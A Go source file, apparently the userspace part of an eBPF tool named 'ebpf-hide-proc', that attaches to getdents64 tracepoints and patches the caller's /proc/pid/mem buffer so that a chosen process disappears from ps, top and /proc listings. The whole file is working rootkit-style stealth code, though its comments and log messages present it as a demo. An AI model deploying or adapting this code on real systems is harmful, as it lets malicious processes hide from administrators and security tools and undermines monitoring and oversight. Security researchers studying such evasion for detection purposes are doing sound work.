// SPDX-License-Identifier: GPL-2.0
// ebpf-hide-proc: hide a process from ps/top/ls using eBPF + /proc/pid/mem patching
//
// Architecture:
//   Kernel eBPF: hooks getdents64, scans dirent buffer using fast u64 comparison,
//                sends match events via ringbuf
//   Go userspace: receives events, patches caller memory via /proc/pid/mem
//
// Usage:
//   sudo ./ebpf-hide-proc              # hide self
//   sudo ./ebpf-hide-proc -pid 1234    # hide PID 1234

package main

//go:generate go run github.com/cilium/ebpf/cmd/bpf2go -cc clang -cflags "-O2 -g -Wall -target bpf" -target amd64 hideProc ./bpf/hide_proc.c

import (
	"bytes"
	"encoding/binary"
	"flag"
	"fmt"
	"log"
	"os"
	"os/signal"
	"strconv"
	"syscall"

	"github.com/cilium/ebpf/link"
	"github.com/cilium/ebpf/ringbuf"
	"github.com/cilium/ebpf/rlimit"
)

const nameMax = 16

type hideEvent struct {
	CallerPID   uint32
	CallerTID   uint32
	BufAddr     uint64
	EntryOffset uint64
	EntryReclen uint16
	PrevReclen  uint16
	Pad         uint32
	PrevOffset  uint64
	TotalSize   int64
	DName       [nameMax]byte
}

func main() {
	var targetPID int
	flag.IntVar(&targetPID, "pid", 0, "PID to hide (default: self)")
	flag.Parse()

	if targetPID == 0 {
		targetPID = os.Getpid()
	}
	pidStr := strconv.Itoa(targetPID)

	log.Printf("=== eBPF Process Hider Demo ===")
	log.Printf("Target PID: %d (%s)", targetPID, pidStr)
	log.Printf("My PID:     %d", os.Getpid())

	if err := rlimit.RemoveMemlock(); err != nil {
		log.Fatalf("memlock: %v", err)
	}

	objs := hideProcObjects{}
	if err := loadHideProcObjects(&objs, nil); err != nil {
		log.Fatalf("load eBPF: %v", err)
	}
	defer objs.Close()

	// Build PID value as u64 (little-endian byte string)
	// "12345" -> 0x00_00_00_35_34_33_32_31 on little-endian
	var pidVal uint64
	var pidMask uint64
	pidBytes := []byte(pidStr + "\x00") // include null terminator
	for i := 0; i < len(pidBytes) && i < 8; i++ {
		pidVal |= uint64(pidBytes[i]) << (i * 8)
		pidMask |= 0xFF << (i * 8)
	}

	log.Printf("PID match: val=0x%016x mask=0x%016x", pidVal, pidMask)

	valBuf := make([]byte, 8)
	binary.LittleEndian.PutUint64(valBuf, pidVal)
	if err := objs.PidValMap.Put(uint32(0), valBuf); err != nil {
		log.Fatalf("set pid val: %v", err)
	}

	maskBuf := make([]byte, 8)
	binary.LittleEndian.PutUint64(maskBuf, pidMask)
	if err := objs.PidMaskMap.Put(uint32(0), maskBuf); err != nil {
		log.Fatalf("set pid mask: %v", err)
	}

	// Attach tracepoints
	tpEnter, err := link.Tracepoint("syscalls", "sys_enter_getdents64",
		objs.TracepointSysEnterGetdents64, nil)
	if err != nil {
		log.Fatalf("attach enter: %v", err)
	}
	defer tpEnter.Close()

	tpExit, err := link.Tracepoint("syscalls", "sys_exit_getdents64",
		objs.TracepointSysExitGetdents64, nil)
	if err != nil {
		log.Fatalf("attach exit: %v", err)
	}
	defer tpExit.Close()

	rd, err := ringbuf.NewReader(objs.Events)
	if err != nil {
		log.Fatalf("ringbuf: %v", err)
	}
	defer rd.Close()

	log.Println("eBPF attached!")
	log.Println()
	log.Printf(">>> Process %d is now HIDDEN from ps / top / ls /proc <<<", targetPID)
	log.Println()
	log.Printf("Verify:  ps aux | grep %d", targetPID)
	log.Printf("Direct:  cat /proc/%d/status  (still works)", targetPID)
	log.Println("Press Ctrl+C to stop.")

	sig := make(chan os.Signal, 1)
	signal.Notify(sig, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-sig
		log.Printf("\nStopping. PID %d visible again.", targetPID)
		rd.Close()
	}()

	cnt := 0
	for {
		rec, err := rd.Read()
		if err != nil {
			if err.Error() == "ringbuf reader was closed" {
				break
			}
			continue
		}

		var ev hideEvent
		if err := binary.Read(bytes.NewReader(rec.RawSample),
			binary.LittleEndian, &ev); err != nil {
			continue
		}

		if patchMem(&ev) {
			cnt++
			name := string(bytes.TrimRight(ev.DName[:], "\x00"))
			log.Printf("[hide #%d] Removed '%s' from PID %d's readdir (offset=%d)",
				cnt, name, ev.CallerPID, ev.EntryOffset)
		}
	}
	log.Printf("Total hides: %d", cnt)
}

func patchMem(ev *hideEvent) bool {
	f, err := os.OpenFile(fmt.Sprintf("/proc/%d/mem", ev.CallerPID), os.O_RDWR, 0)
	if err != nil {
		return false
	}
	defer f.Close()

	maxBad := uint64(0xFFFFFFFF00000000)
	if ev.PrevOffset < maxBad && ev.PrevReclen > 0 {
		addr := int64(ev.BufAddr + ev.PrevOffset + 16)
		buf := make([]byte, 2)
		if _, err := f.ReadAt(buf, addr); err != nil {
			return false
		}
		cur := binary.LittleEndian.Uint16(buf)
		binary.LittleEndian.PutUint16(buf, cur+ev.EntryReclen)
		_, err := f.WriteAt(buf, addr)
		return err == nil
	}

	_, err = f.WriteAt(make([]byte, 8), int64(ev.BufAddr+ev.EntryOffset))
	return err == nil
}
